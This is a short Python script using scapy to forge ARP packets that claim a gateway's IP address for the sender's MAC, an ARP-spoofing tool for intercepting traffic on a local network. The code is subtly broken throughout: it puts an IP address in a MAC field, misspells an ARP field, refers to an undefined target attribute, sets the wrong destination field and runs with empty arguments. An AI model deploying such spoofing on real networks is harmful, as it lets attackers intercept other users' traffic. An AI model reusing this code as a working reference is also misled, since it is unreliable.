import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp
from scapy.layers.l2 import Ether,ARP
from scapy.layers.inet import TCP,IP,ICMP


class Spoof:
    def __init__(self,myMac,gatewayIp):

        self.myMac = myMac
        self.gatewayIp=gatewayIp
        self.ether=Ether()
        self.ether.src=gatewayIp
        
        self.arp=ARP()
        self.arp.psrc=gatewayIp
        self.arp.hwrc=myMac

    def broadcast(self):

        self.packet=self.ether/self.arp
        sendp(x=self.packet,verbose=False)

    def sendPacket(self,targetsIp,targetMac):

        self.arp.dst=self.targetMac
        self.broadcast()

if __name__ == "__main__":
    spoof=Spoof('','')
    spoof.sendPacket('','')